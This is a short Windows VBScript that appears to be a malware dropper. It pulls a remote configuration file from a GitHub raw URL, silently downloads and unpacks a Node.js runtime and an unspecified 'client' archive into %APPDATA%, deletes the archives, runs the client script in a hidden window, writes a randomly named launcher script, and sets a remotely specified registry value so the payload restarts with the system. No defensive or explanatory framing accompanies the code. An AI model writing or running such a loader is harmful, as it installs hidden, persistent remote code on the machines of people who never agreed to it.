Set objShell = CreateObject("Wscript.Shell")
Set objFSO   = CreateObject("Scripting.FileSystemObject")
Set objHTTP  = CreateObject("MSXML2.XMLHTTP")


configUrl = "https://raw.githubusercontent.com/DaleGelb/files/main/ConfAl.txt"


objHTTP.Open "GET", configUrl, False
objHTTP.Send

If objHTTP.Status <> 200 Then
    WScript.Quit
End If


Set dict = CreateObject("Scripting.Dictionary")
lines = Split(objHTTP.ResponseText, vbCrLf)

For Each line In lines
    If Trim(line) <> "" And InStr(line, "=") > 0 Then
        key   = Trim(Split(line, "=")(0))
        value = Trim(Split(line, "=")(1))
        dict(key) = value
    End If
Next


nodeZipUrl   = dict("NODE_ZIP_URL")
clientZipUrl = dict("CLIENT_ZIP_URL")
clientJsName = dict("CLIENT_JS")
regPath      = dict("REG_PATH")


appData   = objShell.ExpandEnvironmentStrings("%APPDATA%")
nodeZip   = appData & "\node.zip"
clientZip = appData & "\client.zip"
nodeDir   = appData & "\node-v22.19.0-win-x64"


objShell.Run "cmd /c curl -L -o """ & nodeZip & """ " & nodeZipUrl, 0, True
objShell.Run "cmd /c tar -xf """ & nodeZip & """ -C """ & appData & """", 0, True


objShell.Run "cmd /c curl -L -o """ & clientZip & """ " & clientZipUrl, 0, True
objShell.Run "cmd /c tar -xf """ & clientZip & """ -C """ & nodeDir & """", 0, True


If objFSO.FileExists(nodeZip) Then objFSO.DeleteFile nodeZip, True
If objFSO.FileExists(clientZip) Then objFSO.DeleteFile clientZip, True


objShell.Run """" & nodeDir & "\node.exe"" """ & nodeDir & "\" & clientJsName & """", 0, False


vbsFile = nodeDir & "\KjjxautA.vbs"
Set f = objFSO.CreateTextFile(vbsFile, True)
f.WriteLine "Set sh = CreateObject(""Wscript.Shell"")"
f.WriteLine "q = Chr(34)"
f.WriteLine "cmd = q & """ & nodeDir & "\node.exe"" & q & "" "" & q & """ & nodeDir & "\" & clientJsName & """ & q"
f.WriteLine "sh.Run cmd, 0, False"
f.Close

objShell.RegWrite regPath, "wscript.exe """ & vbsFile & """", "REG_SZ"
